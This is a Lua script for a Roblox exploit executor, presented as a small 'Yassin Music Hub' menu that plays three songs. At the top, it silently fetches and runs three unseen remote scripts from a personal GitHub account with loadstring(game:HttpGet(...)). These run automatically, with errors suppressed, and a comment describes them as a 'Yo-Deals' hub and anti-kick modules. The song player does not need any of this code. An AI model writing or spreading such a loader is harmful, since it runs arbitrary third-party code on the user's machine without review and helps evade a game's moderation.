-- ============================================================
-- YASSIN HUB - MUSIC MENU WITH MINIMIZE / TOGGLE BUTTON
-- ============================================================

-- 1. تحميل السكريبتات الخارجية بأمان تام (Yo-Deals & Anti-Kicks)
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yahyamayggiiixyahya-boop/Yo-Deals-HUB-PRO/refs/heads/main/main.lua"))()
    end)
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yahyamayggiiixyahya-boop/Anti_KickV1/refs/heads/main/main.lua"))()
    end)
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yahyamayggiiixyahya-boop/Anti_KickV2/refs/heads/main/main.lua"))()
    end)
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")

-- دالة تحميل الملفات الصوتية بأمان تام
local function getCustomSound(url, fileName)
    local success, res = pcall(function()
        if writefile and readfile and isfile and getcustomasset then
            if not isfile(fileName) then
                writefile(fileName, game:HttpGet(url))
            end
            return getcustomasset(fileName)
        end
        return url
    end)
    if success then return res else return url end
end

-- واجهة القائمة الصغيرة للأغاني
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "YassinMusicHubGui"
ScreenGui.Parent = game:WaitForChild("CoreGui")
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 12, 32)
MainFrame.BackgroundTransparency = 0.15
MainFrame.Size = UDim2.new(0, 320, 0, 220)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
MainFrame.Active = true
MainFrame.Draggable = true
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 16)

-- إطار القائمة بلمعة فخمة
local MainStroke = Instance.new("UIStroke")
MainStroke.Parent = MainFrame
MainStroke.Color = Color3.fromRGB(140, 220, 255)
MainStroke.Transparency = 0.25
MainStroke.Thickness = 2

-- رأس القائمة (Header)
local Header = Instance.new("Frame")
Header.Parent = MainFrame
Header.Size = UDim2.new(1, 0, 0, 45)
Header.BackgroundColor3 = Color3.fromRGB(30, 20, 55)
Header.BackgroundTransparency = 0.2
Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 16)

local HeaderText = Instance.new("TextLabel")
HeaderText.Parent = Header
HeaderText.Size = UDim2.new(1, -90, 1, 0)
HeaderText.Position = UDim2.new(0, 15, 0, 0)
HeaderText.BackgroundTransparency = 1
HeaderText.Text = "🎵 Yassin Music Hub"
HeaderText.TextColor3 = Color3.fromRGB(120, 220, 255)
HeaderText.Font = Enum.Font.GothamBold
HeaderText.TextSize = 14
HeaderText.TextXAlignment = Enum.TextXAlignment.Left

-- زر التصغير / الإخفاء (-)
local MinBtn = Instance.new("TextButton")
MinBtn.Parent = Header
MinBtn.Size = UDim2.new(0, 28, 0, 28)
MinBtn.Position = UDim2.new(1, -70, 0, 8)
MinBtn.BackgroundColor3 = Color3.fromRGB(50, 35, 80)
MinBtn.Text = "-"
MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinBtn.Font = Enum.Font.GothamBold
MinBtn.TextSize = 16
Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 8)

-- زر الإغلاق الكامل (X)
local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = Header
CloseBtn.Size = UDim2.new(0, 28, 0, 28)
CloseBtn.Position = UDim2.new(1, -35, 0, 8)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 70)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 14
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)

-- حاوية الأزرار
local Container = Instance.new("ScrollingFrame")
Container.Parent = MainFrame
Container.Size = UDim2.new(1, 0, 1, -50)
Container.Position = UDim2.new(0, 0, 0, 50)
Container.BackgroundTransparency = 1
Container.CanvasSize = UDim2.new(0, 0, 0, 170)
Container.ScrollBarThickness = 4

-- برمجة زر التصغير والإخفاء
local isMinimized = false
MinBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    Container.Visible = not isMinimized
    MainFrame.Size = isMinimized and UDim2.new(0, 320, 0, 45) or UDim2.new(0, 320, 0, 220)
    MinBtn.Text = isMinimized and "+" or "-"
end)

-- نظام تشغيل الأغاني
local activeMenuSound = nil

local function PlayMenuSong(url, fileName, name)
    if activeMenuSound then activeMenuSound:Destroy() end
    task.spawn(function()
        local asset = getCustomSound(url, fileName)
        local sound = Instance.new("Sound")
        sound.Name = name
        sound.SoundId = asset
        sound.Volume = 2.0
        sound.Looped = true
        sound.Parent = SoundService
        sound:Play()
        activeMenuSound = sound
    end)
end

local function StopMenuSong()
    if activeMenuSound then
        activeMenuSound:Stop()
        activeMenuSound:Destroy()
        activeMenuSound = nil
    end
end

CloseBtn.MouseButton1Click:Connect(function()
    StopMenuSong()
    ScreenGui:Destroy()
end)

-- دالة إنشاء أزرار الأغاني (3 أغاني)
local function CreateSongButton(text, yPos)
    local Label = Instance.new("TextLabel")
    Label.Parent = Container
    Label.Size = UDim2.new(1, -120, 0, 35)
    Label.Position = UDim2.new(0, 15, 0, yPos)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.TextColor3 = Color3.fromRGB(220, 220, 240)
    Label.Font = Enum.Font.GothamSemibold
    Label.TextSize = 13
    Label.TextXAlignment = Enum.TextXAlignment.Left

    local Btn = Instance.new("TextButton")
    Btn.Parent = Container
    Btn.Size = UDim2.new(0, 70, 0, 28)
    Btn.Position = UDim2.new(1, -85, 0, yPos + 3)
    Btn.BackgroundColor3 = Color3.fromRGB(40, 30, 65)
    Btn.Text = "OFF"
    Btn.TextColor3 = Color3.fromRGB(180, 180, 180)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 12
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
    
    local btnStroke = Instance.new("UIStroke")
    btnStroke.Parent = Btn
    btnStroke.Color = Color3.fromRGB(100, 150, 255)
    btnStroke.Transparency = 0.5
    
    return Btn
end

local BtnEgyptian2 = CreateSongButton("أغنية مصرية 2", 15)
local BtnNuts = CreateSongButton("أغنية NUTS", 65)
local BtnLucid = CreateSongButton("أغنية Lucid Dreams", 115)

local eg2Playing = false
local nutsPlaying = false
local lucidPlaying = false

local function resetSongButtons()
    local btns = {BtnEgyptian2, BtnNuts, BtnLucid}
    for _, b in ipairs(btns) do
        b.Text = "OFF"
        b.BackgroundColor3 = Color3.fromRGB(40, 30, 65)
        b.TextColor3 = Color3.fromRGB(180, 180, 180)
    end
    eg2Playing = false
    nutsPlaying = false
    lucidPlaying = false
end

BtnEgyptian2.MouseButton1Click:Connect(function()
    if eg2Playing then
        StopMenuSong()
        resetSongButtons()
    else
        resetSongButtons()
        eg2Playing = true
        PlayMenuSong("https://files.catbox.moe/0sah2q.mp3", "egyptian2_song.mp3", "Yassin_Egyptian2")
        BtnEgyptian2.Text = "ON"
        BtnEgyptian2.BackgroundColor3 = Color3.fromRGB(40, 160, 100)
        BtnEgyptian2.TextColor3 = Color3.fromRGB(255, 255, 255)
    end
end)

BtnNuts.MouseButton1Click:Connect(function()
    if nutsPlaying then
        StopMenuSong()
        resetSongButtons()
    else
        resetSongButtons()
        nutsPlaying = true
        PlayMenuSong("https://archive.org/download/li-l-peep-nuts-feat.-lil-skil-extended_202011/LiL%20PEEP%20-%20nuts%20%28feat.%20lil%20skil%29%20%28Extended%29.mp3", "nuts_song.mp3", "MVP_NUTS")
        BtnNuts.Text = "ON"
        BtnNuts.BackgroundColor3 = Color3.fromRGB(40, 160, 100)
        BtnNuts.TextColor3 = Color3.fromRGB(255, 255, 255)
    end
end)

BtnLucid.MouseButton1Click:Connect(function()
    if lucidPlaying then
        StopMenuSong()
        resetSongButtons()
    else
        resetSongButtons()
        lucidPlaying = true
        PlayMenuSong("https://file.garden/algLafWA1jk8WMfK/Lucid%20Dreams%20-%20Clean%20-%20Juice%20WRLD(MP3_160K).mp3", "lucid_song.mp3", "CRYON_LucidDreams")
        BtnLucid.Text = "ON"
        BtnLucid.BackgroundColor3 = Color3.fromRGB(40, 160, 100)
        BtnLucid.TextColor3 = Color3.fromRGB(255, 255, 255)
    end
end)

print("YASSIN MUSIC HUB WITH MINIMIZE LOADED!")
